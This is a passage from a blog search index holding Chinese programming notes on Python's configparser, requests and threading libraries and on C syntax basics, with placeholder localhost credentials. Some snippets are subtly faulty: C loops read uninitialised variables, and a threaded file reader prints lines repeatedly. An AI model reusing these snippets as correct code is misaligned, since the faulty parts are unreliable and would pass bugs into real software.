startButton);<br><br>        Scene scene = new Scene(root, 300, 100);<br>        primaryStage.setScene(scene);<br>        primaryStage.show();<br>    &#125;<br><br>    public static void main(String[] args) &#123;<br>        launch(args);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JAVA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>configparser 库</title>
      <link href="/2022/05/03/%E8%AF%AD%E8%A8%80/Python/%E5%BA%93/configparser%20%E5%BA%93/configparser/"/>
      <url>/2022/05/03/%E8%AF%AD%E8%A8%80/Python/%E5%BA%93/configparser%20%E5%BA%93/configparser/</url>
      
        <content type="html"><![CDATA[<h1 id="config-ini"><a href="#config-ini" class="headerlink" title="config.ini"></a>config.ini</h1><p><code>config.ini</code> 内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># sections<br>[名称]<br># items<br>test1=1<br>test2=2<br><br>[mysql]<br>host=127.0.0.1<br>port=3306<br>user=root<br>password=123456<br>dbname=test<br><br>[redis]<br>host=127.0.0.1<br>port=6379<br>password=123456<br>db=qqq<br></code></pre></td></tr></table></figure><h1 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h1><p><strong>实例化</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import configparser<br>cf = configparser.ConfigParser()<br></code></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>cf.read(‘.&#x2F;config.ini’)</td><td>读取文件，返回 list</td></tr><tr><td>cf.sections()</td><td>获取配置文件中所有 sections 的 list</td></tr><tr><td>cf.options(‘config’)</td><td>获取指定 sections 的的所有配置项</td></tr><tr><td>cf.items(‘mysql’)</td><td>获取指定 sections 所有配置项的键值对</td></tr><tr><td>cf.get(‘mysql’, ‘host’)</td><td>获取指定 sections 中 host 的值</td></tr><tr><td>cf.getint(‘mysql’, ‘port’)</td><td>获取指定 sections 中 host 的值（int型）</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>requests 库</title>
      <link href="/2022/05/03/%E8%AF%AD%E8%A8%80/Python/%E5%BA%93/requests%E5%BA%93/reqeusts/"/>
      <url>/2022/05/03/%E8%AF%AD%E8%A8%80/Python/%E5%BA%93/requests%E5%BA%93/reqeusts/</url>
      
        <content type="html"><![CDATA[<h1 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h1><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>request（）</td><td>构造一个请求，值成一下各种方法的基础方法</td></tr><tr><td>get（）</td><td>Get 方式请求</td></tr><tr><td>post（）</td><td>Post 方式请求</td></tr><tr><td>head（）</td><td>获取 HTML 网页的头部信息</td></tr><tr><td>put（）</td><td>向 HTML 网页提交 PUT 请求</td></tr><tr><td>patch（）</td><td>向 HTML 网页提交局部修改请求</td></tr><tr><td>delete（）</td><td>向 HTML 网页提交删除请求</td></tr><tr><td>options（）</td><td>向 HTML 网页提交 options 请求</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 请求<br>response = requests.get(&#x27;http://127.0.0.1&#x27;, params=payload)<br>response = requests.post(&#x27;http://127.0.0.1&#x27;, json=payload)<br><br># 关闭警告<br>requests.packages.urllib3.disable_warnings()<br><br># 编码<br>response.encoding = &quot;utf-8&quot;<br># 自动解析编码<br>test = requests.get(url=&quot;https://baidu.com&quot;)<br>test.encoding = test.apparent_encoding<br><br>#  设置最大重定向数量<br>session = requests.Session()<br>session.max_redirects = 3<br>session.get(url)<br><br># 非文本请求，以字节的方式访问请求响应体<br>response.content<br><br># 访问网页时的 cookie<br>response.cookies<br><br># 响应状态码<br>response.status_code<br><br># 获取来自服务器的原始套接字响应<br>response.raw<br>response.raw.read(10)<br></code></pre></td></tr></table></figure><h1 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h1><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>params</td><td>字典或字节序列，作为参数增加到 url 中</td></tr><tr><td>data</td><td>字典、字节序列或文件对象，作为 Request 的内容</td></tr><tr><td>json</td><td>JSON 格式的数据，作为 Request 的内容</td></tr><tr><td>headers</td><td>字典、HTTP 定制头</td></tr><tr><td>cookies</td><td>字典或 CokkieJar、Request中的 auth，元组支持 HTTP 认证功能</td></tr><tr><td>files</td><td>字典类型，传输文件</td></tr><tr><td>timeout</td><td>设定超时时间，单位为秒</td></tr><tr><td>proxies</td><td>字典类型，设定访问代理服务器，可以增加登录认证</td></tr><tr><td>allow_redirects</td><td>Ture&#x2F;False，默认为True（重定向开关）</td></tr><tr><td>stream</td><td>True&#x2F;False，默认为True（获取内容立即下载开关）</td></tr><tr><td>verify</td><td>True&#x2F;False，默认True（ 认证 SSL 证书开关）</td></tr><tr><td>cert</td><td>本地 SSL 证书</td></tr><tr><td>auth</td><td>元组（支持 HTTP 认证功能）</td></tr></tbody></table><h1 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">proxies = &#123;<br>            &quot;http&quot;: &quot;http://127.0.0.1:8080&quot;,<br>            &quot;https&quot;: &quot;https://127.0.0.1:8080&quot;<br>        &#125;<br>response = requests.get(&#x27;http://127.0.0.1&#x27;, proxies=proxies)<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>threading 库</title>
      <link href="/2022/05/03/%E8%AF%AD%E8%A8%80/Python/%E5%BA%93/threading%E5%BA%93/threading%E5%BA%93/"/>
      <url>/2022/05/03/%E8%AF%AD%E8%A8%80/Python/%E5%BA%93/threading%E5%BA%93/threading%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h1 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h1><table><thead><tr><th>方法&#x2F;属性</th><th>描述</th></tr></thead><tbody><tr><td>Thread(target, args)</td><td>创建一个新线程，<code>target</code> 是线程函数，<code>args</code> 是传递给线程函数的参数。</td></tr><tr><td>start()</td><td>启动线程。</td></tr><tr><td>run()</td><td>定义线程要执行的代码，通常由 <code>target</code> 指定的目标函数来调用。</td></tr><tr><td>join(timeout&#x3D;None)</td><td>阻塞当前线程，等待线程完成执行。如果指定了 <code>timeout</code>，则最多等待 <code>timeout</code> 秒。</td></tr><tr><td>is_alive()</td><td>返回线程是否还在执行中。</td></tr><tr><td>name</td><td>线程的名称，可以通过构造函数或 <code>setName</code> 方法设置。</td></tr><tr><td>ident</td><td>线程的唯一标识符。</td></tr><tr><td>daemon</td><td>设置线程是否为守护线程（后台线程）。</td></tr><tr><td>current_thread()</td><td>返回当前线程对象。</td></tr><tr><td>active_count()</td><td>返回当前活动线程的数量。</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import threading<br><br>def getInfo():<br>    print(&quot;test&quot;)<br><br># 创建3个线程<br>threads = []<br>for _ in range(3):<br>    thread = threading.Thread(target=getInfo)<br>    threads.append(thread)<br><br># 启动所有线程<br>for thread in threads:<br>    thread.start()<br><br># 等待所有线程完成<br>for thread in threads:<br>    thread.join()<br><br></code></pre></td></tr></table></figure><h1 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import threading<br><br># 读取文件中的URL并输出<br>def process_url(filename, line_number, lock):<br>    with open(filename, &#x27;r&#x27;) as file:<br>        lines = file.readlines()<br>        while line_number &lt; total_lines:<br>            line = lines[line_number].strip()<br>            with lock:<br>                print(f&quot;URL: &#123;line&#125;&quot;)<br>            line_number += 1<br><br># 从文件中读取的URL<br>file_name = &quot;1.txt&quot;<br><br># 获取文件的总行数<br>with open(file_name, &#x27;r&#x27;) as file:<br>    total_lines = len(file.readlines())<br><br># 创建锁<br>output_lock = threading.Lock()<br><br># 创建多个线程<br>num_threads = 5  # 可以根据需要调整线程数量<br>threads = []<br><br>for i in range(num_threads):<br>    thread = threading.Thread(target=process_url, args=(file_name, i, output_lock))<br>    threads.append(thread)<br><br># 启动线程<br>for thread in threads:<br>    thread.start()<br><br># 等待所有线程完成<br>for thread in threads:<br>    thread.join()<br><br>print(&quot;All threads have finished.&quot;)<br><br></code></pre></td></tr></table></figure><h1 id="Queue"><a href="#Queue" class="headerlink" title="Queue"></a>Queue</h1><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>Queue(maxsize)</td><td>创建一个具有固定大小的队列对象，<code>maxsize</code> 指定队列的最大容量。</td></tr><tr><td>q.put(item, block&#x3D;True)</td><td>将项目放入队列。如果队列已满并且<code>block</code>为<code>True</code>，则会阻塞直到队列有空间为止。</td></tr><tr><td>q.get(block&#x3D;True, timeout&#x3D;None)</td><td>从队列中获取并返回项目。如果队列为空并且<code>block</code>为<code>True</code>，则会阻塞直到队列非空为止。如果<code>timeout</code>不为<code>None</code>，则会在超时后引发异常。</td></tr><tr><td>q.put_nowait(item)</td><td>将项目放入队列，但不会阻塞。如果队列已满，会引发<code>Queue.Full</code>异常。</td></tr><tr><td>q.get_nowait()</td><td>从队列中获取并返回项目，但不会阻塞。如果队列为空，会引发<code>Queue.Empty</code>异常。</td></tr><tr><td>q.qsize()</td><td>返回队列中当前的项目数。</td></tr><tr><td>q.empty()</td><td>如果队列为空，返回<code>True</code>；否则返回<code>False</code>。</td></tr><tr><td>q.full()</td><td>如果队列已满，返回<code>True</code>；否则返回<code>False</code>。</td></tr><tr><td>q.task_done()</td><td>通知队列，已完成由<code>q.get()</code>获取的任务。</td></tr><tr><td>q.join()</td><td>阻塞直到队列中的所有项目都已被获取和处理。</td></tr><tr><td>q.put(item, block&#x3D;True, timeout&#x3D;None)&#96;</td><td>将项目放入队列，并可选地指定<code>block</code>参数和超时<code>timeout</code>。这是<code>q.put()</code>方法的扩展，它允许指定是否要阻塞以及超时值。</td></tr><tr><td>q.get(block&#x3D;True, timeout&#x3D;None)&#96;</td><td>从队列中获取并返回项目，并可选地指定<code>block</code>参数和超时<code>timeout</code>。这是<code>q.get()</code>方法的扩展，它允许指定是否要阻塞以及超时值。</td></tr><tr><td>q.put_nowait(item)&#96;</td><td>将项目放入队列，但不会阻塞。如果队列已满，会引发<code>Queue.Full</code>异常。</td></tr><tr><td>q.get_nowait()</td><td>从队列中获取并返回项目，但不会阻塞。如果队列为空，会引发<code>Queue.Empty</code>异常。</td></tr><tr><td>q.join()</td><td>阻塞直到队列中的所有项目都已被获取和处理。</td></tr></tbody></table><h2 id="读取文件-1"><a href="#读取文件-1" class="headerlink" title="读取文件"></a>读取文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import threading<br>import queue<br><br># 读取文件并将每行放入队列<br>def read_file_and_enqueue(filename, output_queue):<br>    with open(filename, &#x27;r&#x27;) as file:<br>        for line in file:<br>            output_queue.put(line.strip())  # 从文件读取的每一行去掉换行符后放入队列<br>    output_queue.put(None)  # 表示文件读取完毕<br><br># 处理队列中的内容<br>def process_lines(input_queue, output_queue):<br>    while True:<br>        line = input_queue.get()<br>        if line is None:<br>            input_queue.task_done()<br>            break<br><br>        # 在这里执行对每行的处理<br>        result = f&quot;Processed: &#123;line.upper()&#125;&quot;<br>        output_queue.put(result)<br>        input_queue.task_done()<br><br># 文件名<br>file_name = &#x27;1.txt&#x27;<br><br># 创建队列<br>read_queue = queue.Queue()<br>process_queue = queue.Queue()<br><br># 创建线程读取文件<br>read_thread = threading.Thread(target=read_file_and_enqueue, args=(file_name, read_queue))<br><br># 创建多个线程处理内容<br>process_threads = [threading.Thread(target=process_lines, args=(read_queue, process_queue)) for _ in range(3)]<br><br># 启动线程<br>read_thread.start()<br>for thread in process_threads:<br>    thread.start()<br><br># 等待文件读取线程完成<br>read_thread.join()<br><br># 向处理线程发送结束信号<br>for _ in range(len(process_threads)):<br>    read_queue.put(None)<br><br># 等待处理线程完成<br>for thread in process_threads:<br>    thread.join()<br><br># 打印处理后的结果<br>while not process_queue.empty():<br>    result = process_queue.get()<br>    print(result)<br><br>print(&quot;All threads have finished.&quot;)<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C</title>
      <link href="/2022/05/02/%E8%AF%AD%E8%A8%80/C/C/"/>
      <url>/2022/05/02/%E8%AF%AD%E8%A8%80/C/C/</url>
      
        <content type="html"><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><a href="https://www.w3cschool.cn/minicourse/play/clanguage?cp=11270&gid=0">https://www.w3cschool.cn/minicourse/play/clanguage?cp=11270&amp;gid=0</a></p><p><a href="https://www.runoob.com/cprogramming/c-program-structure.html">https://www.runoob.com/cprogramming/c-program-structure.html</a></p><p>JSFinder、LinkFinder、Packer-Fuzzer</p><p>下载 <a href="https://udomain.dl.sourceforge.net/project/mingw-w64/Toolchains%20targetting%20Win64/Personal%20Builds/mingw-builds/8.1.0/threads-posix/seh/x86_64-8.1.0-release-posix-seh-rt_v6-rev0.7z">mingw x64</a></p><p>解压后将其路径添加到环境变量中，然后运行如下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  查看 gcc 版本<br>gcc --version<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;stdio.h&gt;<br><br>int main()<br>&#123;<br>   /* 我的第一个 C 程序 */<br>   printf(&quot;Hello, World! \n&quot;);<br>   <br>   return 0;<br>&#125;<br></code></pre></td></tr></table></figure><table><thead><tr><th align="left">关键字</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">auto</td><td align="left">声明自动变量</td></tr><tr><td align="left">break</td><td align="left">跳出当前循环</td></tr><tr><td align="left">case</td><td align="left">开关语句分支</td></tr><tr><td align="left">char</td><td align="left">声明字符型变量或函数返回值类型</td></tr><tr><td align="left">const</td><td align="left">定义常量，如果一个变量被 const 修饰，那么它的值就不能再被改变</td></tr><tr><td align="left">continue</td><td align="left">结束当前循环，开始下一轮循环</td></tr><tr><td align="left">default</td><td align="left">开关语句中的”其它”分支</td></tr><tr><td align="left">do</td><td align="left">循环语句的循环体</td></tr><tr><td align="left">double</td><td align="left">声明双精度浮点型变量或函数返回值类型</td></tr><tr><td align="left">else</td><td align="left">条件语句否定分支（与 if 连用）</td></tr><tr><td align="left">enum</td><td align="left">声明枚举类型</td></tr><tr><td align="left">extern</td><td align="left">声明变量或函数是在其它文件或本文件的其他位置定义</td></tr><tr><td align="left">float</td><td align="left">声明浮点型变量或函数返回值类型</td></tr><tr><td align="left">for</td><td align="left">一种循环语句</td></tr><tr><td align="left">goto</td><td align="left">无条件跳转语句</td></tr><tr><td align="left">if</td><td align="left">条件语句</td></tr><tr><td align="left">int</td><td align="left">声明整型变量或函数</td></tr><tr><td align="left">long</td><td align="left">声明长整型变量或函数返回值类型</td></tr><tr><td align="left">register</td><td align="left">声明寄存器变量</td></tr><tr><td align="left">return</td><td align="left">子程序返回语句（可以带参数，也可不带参数）</td></tr><tr><td align="left">short</td><td align="left">声明短整型变量或函数</td></tr><tr><td align="left">signed</td><td align="left">声明有符号类型变量或函数</td></tr><tr><td align="left">sizeof</td><td align="left">计算数据类型或变量长度（即所占字节数）</td></tr><tr><td align="left">static</td><td align="left">声明静态变量</td></tr><tr><td align="left">struct</td><td align="left">声明结构体类型</td></tr><tr><td align="left">switch</td><td align="left">用于开关语句</td></tr><tr><td align="left">typedef</td><td align="left">用以给数据类型取别名</td></tr><tr><td align="left">unsigned</td><td align="left">声明无符号类型变量或函数</td></tr><tr><td align="left">union</td><td align="left">声明共用体类型</td></tr><tr><td align="left">void</td><td align="left">声明函数无返回值或无参数，声明无类型指针</td></tr><tr><td align="left">volatile</td><td align="left">说明变量在程序执行中可被隐含地改变</td></tr><tr><td align="left">while</td><td align="left">循环语句的循环条件</td></tr></tbody></table><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">printf(a);<br>puts(a);<br>putchar(a);<br></code></pre></td></tr></table></figure><h3 id="获取输入"><a href="#获取输入" class="headerlink" title="获取输入"></a>获取输入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"><br>char a = getchar();<br>scanf(&quot;%d&quot;, &amp;a);<br>gets()<br></code></pre></td></tr></table></figure><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;stdio.h&gt;<br><br>#define test 10# 定义一个标识符来表示一个常量（不占内存，临时）<br><br><br>sizeof()# 获取某个数据所占用空间的字节数<br><br>#  分配内存空间<br>malloc()<br>calloc()<br>realloc()<br><br>free()# 释放动态分配的内存空间<br><br></code></pre></td></tr></table></figure><h2 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h2><h3 id="if"><a href="#if" class="headerlink" title="if"></a>if</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;stdio.h&gt;<br><br>int main()<br>&#123;<br>   if(1==1)<br>   &#123;<br>      printf(&quot;test_1\n&quot;);<br>   &#125;<br>   <br>   if(1==1)// 仅支持下面一行<br>      printf(&quot;test_2&quot;);<br>      <br>   return 0;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="if-else"><a href="#if-else" class="headerlink" title="if else"></a>if else</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;stdio.h&gt;<br><br>int main()<br>&#123;<br>   if(1==2)<br>   &#123;<br>      printf(&quot;test_1\n&quot;);<br>   &#125;<br>   else<br>   &#123;<br>      printf(&quot;test_2&quot;);<br>   &#125;<br>   <br>   return 0;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="else-if"><a href="#else-if" class="headerlink" title="else if"></a>else if</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;stdio.h&gt;<br><br>int main()<br>&#123;<br>   if(1==1)<br>   &#123;<br>      if(2==1)<br>      &#123;<br>         printf(&quot;test_1\n&quot;);<br>      &#125;<br>      else if(3==3)<br>      &#123;<br>         printf(&quot;test_2&quot;);<br>      &#125;<br>   &#125;<br>   <br>   return 0;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;stdio.h&gt;<br><br>int main()<br>&#123;<br>char test = &#x27;C&#x27;;<br><br>switch (test)<br>&#123;<br>case &#x27;A&#x27;:<br>printf(&quot;A\n&quot;);<br>break;<br>case &#x27;B&#x27;:<br>printf(&quot;B\n&quot;);<br>break;<br>case &#x27;C&#x27;:<br>case &#x27;D&#x27;:<br>printf(&quot;test\n&quot;);<br>break;<br>default:<br>printf(&quot;default\n&quot;);<br>break;<br>&#125;<br><br>return 0;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><h3 id="for"><a href="#for" class="headerlink" title="for"></a>for</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;stdio.h&gt;<br><br>int main()<br>&#123;<br>   for(int i=0; i&lt;10; i++)<br>   &#123;<br>      printf(&quot;i = %d\n&quot;, i);<br>   &#125;<br><br>   return 0;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="while"><a href="#while" class="headerlink" title="while"></a>while</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;stdio.h&gt;<br><br>int main()<br>&#123;<br>   int n;<br>   <br>   while (n &lt;= 6)// 判断条件成立即循环<br>   &#123;<br>      printf(&quot;n = %d\n&quot;, n);<br>      ++n;<br>   &#125;<br><br>   return 0;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="do…while"><a href="#do…while" class="headerlink" title="do…while"></a>do…while</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;stdio.h&gt;<br><br>int main()<br>&#123;<br>   int i;<br>   do&#123;<br>      printf(&quot;i = %d\n&quot;, i);<br>      ++i;<br>   &#125;while(i&lt;10);// 先循环在判断<br><br>   return 0;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="goto"><a href="#goto" class="headerlink" title="goto"></a>goto</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;stdio.h&gt;<br><br>int main()<br>&#123;<br>   int i=1;<br>   // 无条件转移语句，可跳转到任意指定标签位置<br>   goto test;<br>   printf(&quot;test_1\n&quot;);<br>   printf(&quot;test_2\n&quot;);<br>   test:<br>      if (i==1)<br>         printf(&quot;test_3\n&quot;);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="存储类"><a href="#存储类" class="headerlink" title="存储类"></a>存储类</h2><p><a href="https://www.runoob.com/cprogramming/c-storage-classes.html">https://www.runoob.com/cprogramming/c-storage-classes.html</a></p><h3 id="auto"><a href="#auto" class="headerlink" title="auto"></a>auto</h3><p><code>auto</code> 存储类是所有局部变量默认的存储类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 